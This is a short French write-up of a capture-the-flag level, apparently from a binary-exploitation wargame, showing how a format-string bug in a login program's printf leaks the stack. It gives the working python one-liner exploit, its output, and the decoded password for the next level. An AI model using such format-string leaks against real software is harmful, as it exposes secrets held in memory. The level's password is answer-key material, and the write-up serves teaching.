# Level 02

Dans se niveau, quand on décompile on peut voir qu'il fait un call à la fonction `system("/bin/sh")` uniquement si le password est égal au contenu du fichier `/home/users/level03/.pass`, mais en regardant de plus près on peut voir que l'username récupérer devient le format du `printf` à la fin du programme.

Nous pouvons exploité le printf pour afficher la stack du programme contenant le fichier `.pass`.

```shell
$ python -c 'print "%22$lx %23$lx %24$lx %25$lx %26$lx"' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d does not have access!
$ python
>>> "48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848".decode("hex")[::-1]
'Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'
```

